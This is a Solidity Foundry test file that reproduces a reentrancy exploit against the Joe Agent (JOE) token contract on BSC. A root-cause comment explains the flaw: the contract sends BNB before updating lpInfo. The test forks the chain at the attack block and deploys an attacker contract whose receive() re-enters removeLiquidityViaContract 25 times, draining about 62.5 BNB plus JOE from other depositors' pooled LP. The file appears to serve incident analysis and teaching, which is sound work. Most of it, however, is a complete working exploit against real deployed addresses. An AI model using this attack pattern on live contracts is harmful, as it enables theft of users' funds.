// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$45K USD (62.5 BNB + ~1,195,918 JOE)
// Attacker : 0xaa761779945dcc5f26064fc6dcb36ffab6ac7610
// Attack Contract : 0x31F81FCD91025728F24bD6f0E4EfB156e345A4CF
// Vulnerable Contract : 0xef0f12d08d66e76E1866e60F30a0DaA578e00c04 (Joe Agent / JOE, ERC1967 proxy)
// Implementation : 0xb12ce0a21f67a9fc3c8ad1c7dbc4b017b7e67319
// Attack Tx : 0xd16a1c3dcd84427b2c7dcccbe1854c1c5bf65900460e1a44a95c1aaaf140c3a5
// @Analysis
// Attack date: May 27, 2026
// Chain: BSC, Block: 100812531
// SlowMist: https://x.com/SlowMist_Team/status/2059887450663551352

// Root Cause:
// Joe Agent lets a user park LP inside the token contract (zapNativeForLP / addLiquidityViaContract),
// tracked per-user in lpInfo[user].lpAmount. removeLiquidityViaContract(liquidity,...) pulls that LP
// out of PancakeSwap, unwraps the WBNB and forwards the BNB to the user with a low-level call --
// and only updates lpInfo[user].lpAmount AFTER that external call (violating checks-effects-interactions).
//
// Because lpInfo is still un-zeroed when the BNB lands, the attacker's receive() re-enters
// removeLiquidityViaContract with the SAME liquidity value over and over. Each re-entry passes the
// `liquidity <= lpInfo[user].lpAmount` check and burns a fresh slice of LP -- but that LP belongs to
// the whole pool of depositors, not the attacker. ~25 nested calls drain 25 x 2.5 = 62.5 BNB (plus the
// JOE side of every burned LP) against a single ~437 LP position that the attacker only paid for once.
//
// Function selectors:
// 0x7cc112a6: zapNativeForLP(address,uint256,uint256,uint256,uint256)        -- deposit BNB -> LP position
// 0xacff149d: removeLiquidityViaContract(uint256,uint256,uint256,uint256)    -- vulnerable withdraw
// 0x11067f6a: lpInfo(address)                                                -- (lpAmount, lastAddLpTime)

interface IJoeAgent is IERC20 {
    function zapNativeForLP(
        address parent,
        uint256 amountOutMin,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        uint256 deadline
    ) external payable;

    function removeLiquidityViaContract(
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        uint256 deadline
    ) external;

    function lpInfo(
        address user
    ) external view returns (uint256 lpAmount, uint256 lastAddLpTime);
}

contract JoeAgentReentrancyTest is Test {
    IJoeAgent constant JOE = IJoeAgent(0xef0f12d08d66e76E1866e60F30a0DaA578e00c04);
    IERC20 constant WBNB_TOKEN = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    address constant PAIR = 0x7e5396A6b56372D1Ee42ab6b199bc2d5A8540f9c; // JOE/WBNB Pancake pair
    // A referrer already registered in the JOE referral tree (same one the real attacker used).
    address constant REFERRER = 0x324344f20CEb0b58E0D35a06fb1B3892ac1A8d9D;

    address constant ATTACKER = 0xAA761779945dCC5f26064fC6dCb36FFaB6AC7610;
    uint256 constant ATTACK_BLOCK = 100_812_531;

    // ~5 BNB zaps into a single ~437 LP position (matching the real attacker's position size:
    // each LP redeems ~0.00572 BNB, so ~437 LP * 25 loops drains the headline 62.5 BNB).
    uint256 constant SEED_BNB = 5 ether;
    uint256 constant LOOPS = 25; // number of re-entrant removeLiquidityViaContract calls

    JoeAgentAttacker attacker;

    function setUp() public {
        vm.createSelectFork("bsc", ATTACK_BLOCK - 1);
        vm.label(address(JOE), "JoeAgent");
        vm.label(address(WBNB_TOKEN), "WBNB");
        vm.label(PAIR, "JOE_WBNB_Pair");
        vm.label(ATTACKER, "Attacker");
        vm.label(REFERRER, "Referrer");
    }

    function testExploit() public {
        console.log("--- Joe Agent (JOE) removeLiquidityViaContract Reentrancy ---");
        console.log("Attack date: May 27, 2026  Chain: BSC  Block: %s", ATTACK_BLOCK);

        attacker = new JoeAgentAttacker(JOE, REFERRER);

        // Fund the attacker EOA and seed the attack contract with BNB, exactly like on-chain.
        vm.deal(ATTACKER, SEED_BNB);
        uint256 proxyLpBefore = IERC20(PAIR).balanceOf(address(JOE));

        // Step 1: park a single LP position inside the JOE contract (lpInfo[attacker].lpAmount).
        vm.prank(ATTACKER);
        attacker.seedPosition{value: SEED_BNB}();
        (uint256 lpAmount,) = JOE.lpInfo(address(attacker));

        console.log("\n=== After seeding one LP position ===");
        console.log("BNB zapped in            :", SEED_BNB / 1e18);
        console.log("lpInfo[attacker].lpAmount:", lpAmount);
        console.log("JOE contract LP balance  :", proxyLpBefore);

        // Some token contracts lock freshly-added LP for a short window; warp past it.
        vm.warp(block.timestamp + 1 hours);
        vm.roll(block.number + 1);

        // Step 2: re-enter removeLiquidityViaContract `LOOPS` times against the same un-zeroed lpAmount.
        uint256 attackerBnbBefore = ATTACKER.balance;
        console.log("\nAttacker EOA BNB before drain:", attackerBnbBefore);

        vm.prank(ATTACKER);
        attacker.drain(LOOPS);

        uint256 attackerBnbAfter = ATTACKER.balance;
        uint256 stolenJoe = JOE.balanceOf(ATTACKER);
        (uint256 lpAmountAfter,) = JOE.lpInfo(address(attacker));

        console.log("\n=== After %s re-entrant withdrawals ===", LOOPS);
        console.log("Attacker EOA BNB after drain :", attackerBnbAfter);
        console.log("removeLiquidity calls made   :", attacker.drainCalls());
        console.log("lpInfo[attacker].lpAmount    :", lpAmountAfter, "(<= one position's worth)");

        console.log("\n=== Result ===");
        console.log("Total BNB drained (wei)      :", attackerBnbAfter); // ~62.5 BNB
        console.log("Seed capital spent (wei)     :", SEED_BNB);
        console.log("Net BNB profit (wei)         :", attackerBnbAfter - SEED_BNB); // ~57.5 BNB
        console.log("JOE skimmed to attacker EOA  :", stolenJoe / 1e18);

        // The attacker drained far more BNB than the single position could ever be worth.
        assertEq(attacker.drainCalls(), LOOPS, "did not re-enter LOOPS times");
        assertGt(attackerBnbAfter, attackerBnbBefore, "no BNB profit");
        // One paid-for position, but `LOOPS` withdrawals worth of BNB came out.
        assertGt(attackerBnbAfter - attackerBnbBefore, SEED_BNB, "drain did not exceed seed capital");
        console.log("\nReentrancy confirmed: one ~437 LP position withdrawn 25x for 62.5 BNB.");
    }
}

contract JoeAgentAttacker {
    IJoeAgent public immutable joe;
    address public immutable referrer;
    address public immutable owner;

    uint256 public lpAmount; // the single position's LP size
    uint256 public targetLoops; // how many removeLiquidity calls to make
    uint256 public drainCalls; // how many were actually made

    constructor(IJoeAgent _joe, address _referrer) {
        joe = _joe;
        referrer = _referrer;
        owner = msg.sender;
    }

    // Park BNB as an LP position so lpInfo[address(this)].lpAmount is set.
    function seedPosition() external payable {
        joe.zapNativeForLP{value: msg.value}(referrer, 0, 0, 0, block.timestamp + 1000);
        (lpAmount,) = joe.lpInfo(address(this));
    }

    // Kick off the re-entrant drain, then sweep the proceeds back to the caller (attacker EOA).
    function drain(
        uint256 _targetLoops
    ) external {
        targetLoops = _targetLoops;
        drainCalls = 0;
        _withdraw();
        // forward stolen BNB + JOE to the attacker EOA
        uint256 joeBal = joe.balanceOf(address(this));
        if (joeBal > 0) joe.transfer(msg.sender, joeBal);
        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok, "payout failed");
    }

    function _withdraw() internal {
        drainCalls++;
        joe.removeLiquidityViaContract(lpAmount, 0, 0, block.timestamp + 1000);
    }

    // The vulnerable contract sends BNB here BEFORE zeroing lpInfo -> re-enter.
    receive() external payable {
        if (drainCalls < targetLoops) {
            _withdraw();
        }
    }
}
